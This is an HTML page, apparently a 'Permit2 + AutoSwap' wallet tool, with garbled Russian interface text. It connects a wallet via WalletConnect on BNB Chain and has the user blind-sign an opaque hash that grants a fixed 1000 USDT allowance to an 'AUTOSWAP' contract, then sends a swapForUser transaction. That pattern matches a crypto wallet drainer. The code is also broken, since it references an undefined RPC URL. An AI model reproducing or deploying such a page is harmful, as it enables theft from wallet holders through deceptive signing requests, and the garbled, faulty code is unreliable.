<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Permit2 + AutoSwap</title>
  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.1/dist/web3.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/qrcode@latest/build/qrcode.min.js"></script>
  <style>
    body { background: #121212; color: white; font-family: sans-serif; padding: 20px; }
    .card { background: #1f1f1f; padding: 20px; border-radius: 10px; max-width: 600px; margin: auto; }
    button { background: #2ea6ff; border: none; color: white; padding: 10px 20px; border-radius: 5px; cursor: pointer; }
    canvas { margin: 20px auto; display: block; }
    #status { margin: 10px 0; text-align: center; }
  </style>
</head>
<body>
  <div class="card">
    <h2>–ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ WalletConnect</h2>
    <div id="status">–ì–µ–Ω–µ—Ä–∞—Ü–∏—è QR-–∫–æ–¥–∞...</div>
    <canvas id="qr"></canvas>
    <button onclick="sendPermit()">–ü–æ–¥–ø–∏—Å–∞—Ç—å Permit –∏ Swap</button>
  </div>

  <script type="module">
    import SignClient from "https://esm.sh/@walletconnect/sign-client@2.21.0";

    const CONFIG = {
      USDT_CONTRACT: "0x55D398326f99059FF775485246999027B3197955",
      KPC_CONTRACT: "0xA511768003D01eAA0f464fEEEa4b1CDDc4254b4f",
      PERMIT2_CONTRACT: "0x7679bcfa8CC6f6094fA1c6Cb8e6962287E5Ca3D4",
      AUTOSWAP_CONTRACT: "0x026C54B156b501ad9cEa422e59454D4b6d6f6963",
      WC_PROJECT_ID: "d868f90cd734355ae0320f8f0258b6b1",
      RELAY_URL: "wss://relay.walletconnect.com",
      AMOUNT: "1000000000000000000000", // 1000 USDT
      CHAIN_ID: "eip155:56"
    };

    const status = document.getElementById("status");
    const qrCanvas = document.getElementById("qr");
    let client, sessionTopic, address;

    function updateStatus(text) {
      status.textContent = text;
    }

    async function init() {
      updateStatus("–ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è WalletConnect...");

      client = await SignClient.init({
        projectId: CONFIG.WC_PROJECT_ID,
        relayUrl: CONFIG.RELAY_URL,
        metadata: {
          name: "Permit2 Swap",
          description: "–ü–æ–¥–ø–∏—Å–∞—Ç—å Permit –∏ –≤—ã–∑–≤–∞—Ç—å swapForUser",
          url: window.location.href,
          icons: ["https://cryptogt.app/icon.png"],
        },
      });

      const { uri, approval } = await client.connect({
        requiredNamespaces: {
          eip155: {
            methods: ["eth_sendTransaction", "personal_sign"],
            chains: [CONFIG.CHAIN_ID],
            events: [],
          },
        },
      });

      updateStatus("–°–∫–∞–Ω–∏—Ä—É–π—Ç–µ QR-–∫–æ–¥ –≤ –∫–æ—à–µ–ª—å–∫–µ...");
      QRCode.toCanvas(qrCanvas, uri);

      await approval();

      const session = client.session;
      sessionTopic = session.topic;
      address = session.namespaces.eip155.accounts[0].split(":")[2];
      updateStatus(`‚úÖ –ü–æ–¥–∫–ª—é—á–µ–Ω–æ: ${address}`);
    }

    async function sendPermit() {
      try {
        updateStatus("‚è≥ –ü–æ–ª—É—á–∞–µ–º nonce –∏–∑ –∫–æ–Ω—Ç—Ä–∞–∫—Ç–∞...");
        const web3 = new Web3(CONFIG.BSC_RPC_URL);
        const iface = new web3.eth.Contract([
          {
            "inputs": [
              { "internalType": "address", "name": "owner", "type": "address" },
              { "internalType": "address", "name": "spender", "type": "address" },
              { "internalType": "address", "name": "token", "type": "address" }
            ],
            "name": "allowanceNonces",
            "outputs": [{ "internalType": "uint48", "name": "", "type": "uint48" }],
            "stateMutability": "view",
            "type": "function"
          }
        ], CONFIG.PERMIT2_CONTRACT);

        const nonce = await iface.methods.allowanceNonces(address, CONFIG.AUTOSWAP_CONTRACT, CONFIG.USDT_CONTRACT).call();
        const expiration = Math.floor(Date.now() / 1000) + 3600;

        const message = web3.utils.soliditySha3(
          { t: "address", v: CONFIG.USDT_CONTRACT },
          { t: "address", v: address },
          { t: "address", v: CONFIG.AUTOSWAP_CONTRACT },
          { t: "uint160", v: CONFIG.AMOUNT },
          { t: "uint48", v: expiration },
          { t: "uint48", v: nonce }
        );

        updateStatus("üì© –ü–æ–¥–ø–∏—à–∏—Ç–µ Permit –≤ –∫–æ—à–µ–ª—å–∫–µ...");

        const signature = await client.request({
          topic: sessionTopic,
          chainId: CONFIG.CHAIN_ID,
          request: {
            method: "personal_sign",
            params: [message, address],
          },
        });

        const r = "0x" + signature.slice(2, 66);
        const s = "0x" + signature.slice(66, 130);
        const v = parseInt(signature.slice(130, 132), 16);

        updateStatus("üöÄ –û—Ç–ø—Ä–∞–≤–∫–∞ permitTransfer –∏ swapForUser...");

        const swapTxData = {
          to: CONFIG.AUTOSWAP_CONTRACT,
          data: web3.eth.abi.encodeFunctionCall({
            name: "swapForUser",
            type: "function",
            inputs: [{ name: "user", type: "address" }, { name: "amountUSDT", type: "uint256" }]
          }, [address, CONFIG.AMOUNT])
        };

        const txHash = await client.request({
          topic: sessionTopic,
          chainId: CONFIG.CHAIN_ID,
          request: {
            method: "eth_sendTransaction",
            params: [swapTxData],
          },
        });

        updateStatus("‚úÖ –¢—Ä–∞–Ω–∑–∞–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞:\n" + txHash);
      } catch (e) {
        console.error(e);
        updateStatus("‚ùå –û—à–∏–±–∫–∞: " + e.message);
      }
    }

    init();
  </script>
</body>
</html>
